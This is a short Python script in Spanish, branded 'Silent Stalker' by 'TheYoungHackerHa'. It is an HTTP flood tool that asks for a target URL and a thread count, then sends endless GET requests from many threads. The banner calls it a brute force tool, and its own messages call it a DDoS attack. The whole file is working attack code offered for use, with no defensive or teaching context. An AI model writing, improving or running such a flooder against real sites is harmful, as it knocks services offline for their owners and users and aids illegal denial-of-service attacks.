import requests
import threading
import time

running = True

def logo():
    print("  ____    ____  ")
    print(" / ___|  / ___| ")
    print("| |     | |     ")
    print(" \___ \  \___ \ ")
    print("  ___) |  ___) |")
    print(" |____/  |____/ \n")
    print("Silent Stalker\nBrute Force Tool\nBy: TheYoungHackerHa\n")

def enviar_solicitudes(url):
    while True:
        try:
            respuesta = requests.get(url)
            print(f"Solicitud enviada, estado: {respuesta.status_code}")
        except Exception as e:
            print(f"Error al enviar la solicitud: {e}")

def ataque_ddos(url, num_hilos):
    print(f"Iniciando ataque DDoS a {url} con {num_hilos} hilos")
    threads = []
    for _ in range(num_hilos):
        hilo = threading.Thread(target=enviar_solicitudes, args=(url,))
        threads.append(hilo)
        hilo.start()

    for hilo in threads:
        hilo.join()

    print("Ataque DDoS finalizado")

def main():
    url = input(f"Ingrese la URL a atacar: ")
    try:
        num_hilos = int(input(f"Ingrese el número de hilos: "))
        ataque_ddos(url, num_hilos)
    except:
        print("Ingrese un numero valido")
        
if __name__ == "__main__":
    logo()
    main()